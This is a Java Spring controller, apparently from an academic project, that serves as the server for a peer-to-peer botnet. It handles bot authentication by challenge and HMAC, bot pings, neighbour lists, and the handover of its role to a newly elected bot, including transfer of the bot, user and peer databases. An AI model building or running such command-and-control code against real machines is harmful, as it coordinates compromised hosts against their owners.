package cs.sii.controller;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.http.HttpStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.domain.Pairs;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;

@Controller
@RequestMapping("/cec")
public class CommandController {

	@Autowired
	private Config configEngine;

	@Autowired
	private Commando cmm;

	@RequestMapping(value = "/neighbours", method = RequestMethod.POST)
	@ResponseBody
	public byte[] getNeighbours(@RequestBody String data, HttpServletResponse error) {
		return cmm.getNeighbours(data);
	}

	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////

	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
	@ResponseBody
	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error,HttpServletRequest req) throws IOException {
		System.out.println("Richiesta di challenge ricevuta da " + req.getRemoteAddr());
		System.out.println("1");
		Pairs<Long, Integer> response = new Pairs<>();
		if (configEngine.isCommandandconquerStatus()) {
			response = cmm.authReq(idBot);
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		System.out.println("2");

		return response;
	}

	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
	@ResponseBody
	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,HttpServletRequest req) throws IOException {
		System.out.println("Richiesta con hmac ricevuta da " + req.getRemoteAddr());
		String response = "";
		if (configEngine.isCommandandconquerStatus()) {
			response = cmm.checkHmac(objects);

		} else {
			response = "Challenge Error";
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;
	}

	/////////////////////////////////////////////////////////////////////////

	@RequestMapping(value = "/prova", method = RequestMethod.GET)
	@ResponseBody
	public String prova() {

		return "";
	}

	// Controller che intercetta i ping dei bot
	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
	@ResponseBody
	public String BotPing(HttpServletResponse error) throws IOException {
		String response = "";
		if (configEngine.isCommandandconquerStatus()) {
			response = "ping";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;
	}

	@RequestMapping(value = "/newKing/roles", method = RequestMethod.POST)
	@ResponseBody
	public List<Role> newKingRoles(@RequestBody String idBot,HttpServletRequest req) {
		System.out.println("Richiesta RUOLI del database da " + req.getRemoteAddr());
		System.out.println("id b"+ idBot);
		System.out.println("id b2"+ cmm.getpServ().getNewKing());
		System.out.println("id b3"+ cmm.getpServ().getNewKing().equals(idBot));

		if (!cmm.getpServ().getNewKing().equals(idBot))
			return null;
		List<Role> response = new ArrayList<Role>();
		// ruoli
		List<Role> x = cmm.getrServ().findAll();
		if(x!=null)
		response.addAll(x);
		return response;
	}

	@RequestMapping(value = "/newKing/bots", method = RequestMethod.POST)
	@ResponseBody
	public List<Bot> newKingBots(@RequestBody String idBot,HttpServletRequest req) {
		System.out.println("Richiesta BOT del database da " + req.getRemoteAddr());
		List<Bot> response = new ArrayList<Bot>();
		// Bot
		if (!cmm.getpServ().getNewKing().equals(idBot))
			return null;
		response.addAll(cmm.getbServ().findAll());
		response.forEach(b -> System.out.println("bot " + b));
		return response;
	}

	@RequestMapping(value = "/newKing/users", method = RequestMethod.POST)
	@ResponseBody
	public List<User> newKingUsers(@RequestBody String idBot,HttpServletRequest req) {
		System.out.println("Richiesta USERS del database da " + req.getRemoteAddr());
		List<User> response = new ArrayList<User>();
		// User
		if (!cmm.getpServ().getNewKing().equals(idBot))
			return null;
		response.addAll(cmm.getuServ().findAll());
		return response;
	}

	@RequestMapping(value = "/newKing/peers", method = RequestMethod.POST)
	@ResponseBody
	public List<String> newKingPeers(@RequestBody String idBot,HttpServletRequest req) {
		System.out.println("Richiesta PEERS del database da " + req.getRemoteAddr());
		List<String> response = new ArrayList<String>();
		// User
		if (!cmm.getpServ().getNewKing().equals(idBot))
			return null;
		cmm.getGraph().edgeSet().forEach(e -> {
			String txt = e.toString();
			txt = txt.replace("(", "");
			txt = txt.replace(")", "");
			txt = txt.replace(" ", "");
			txt = txt.replace(":", "<HH>");
			response.add(txt);
		});
		// response.forEach(resp->System.out.println("cose nel grafo: "+resp));
		System.out.println("response grafo: " + response);
		return response;
	}

	@RequestMapping(value = "/newKing/ready", method = RequestMethod.POST)
	@ResponseBody
	public boolean newKingReady(@RequestBody String idBot,HttpServletRequest req) {
		System.out.println("Richiesta di conferma passaggio di poteri da" + req.getRemoteAddr());
		// avvisa dns
		if (!cmm.getpServ().getNewKing().equals(idBot))
			return false;
		cmm.abdicate();
		configEngine.setCommandandconquerStatus(false);
		return true;
	}

	// TODO RIMUOVERE TEST
	@RequestMapping(value = "/election", method = RequestMethod.GET)
	@ResponseBody
	public boolean startElection(HttpServletRequest req) {
		System.out.println("Richiesta di elezione di un nuovo CeC da " + req.getRemoteAddr());
		if (configEngine.isCommandandconquerStatus()) {
			cmm.startElection();
		}
		return true;
	}

	// Deprecated

	// @RequestMapping(value = "/newKing", method = RequestMethod.POST)
	// @ResponseBody
	//
	// public List<Object> newKing(@RequestBody String j) {
	// List<Object> response = new ArrayList<Object>();
	//
	// Integer i = Integer.parseInt(j);
	//
	// System.out.println("processamento della i: "+(i+10));
	//
	// if(i==1){
	// //ruoli
	// response.addAll(cmm.getrServ().findAll());
	// } else if(i==2) {
	// //bot
	// response.addAll(cmm.getbServ().findAll());
	// } else if(i==3) {
	// //user
	// response.addAll(cmm.getuServ().findAll());
	// } else if(i==4) {
	//// response.addAll(cmm.getGraph().edgeSet());
	// List<Object> aux = new ArrayList<Object>();
	// cmm.getGraph().edgeSet().forEach(e->{
	// String txt = e.toString();
	// txt=txt.replace("(", "");
	// txt=txt.replace(")", "");
	// txt=txt.replace(" ", "");
	// txt=txt.replace(":", "|");
	// System.out.println("adderò: "+txt);
	// aux.add(txt);
	// });
	// response.addAll(aux);
	//// response.forEach(resp->System.out.println("cose nel grafo: "+resp));
	// System.out.println("response grafo: "+response);
	// } else {
	// return null;
	// }
	//
	//
	//
	// return response;
	// }

}
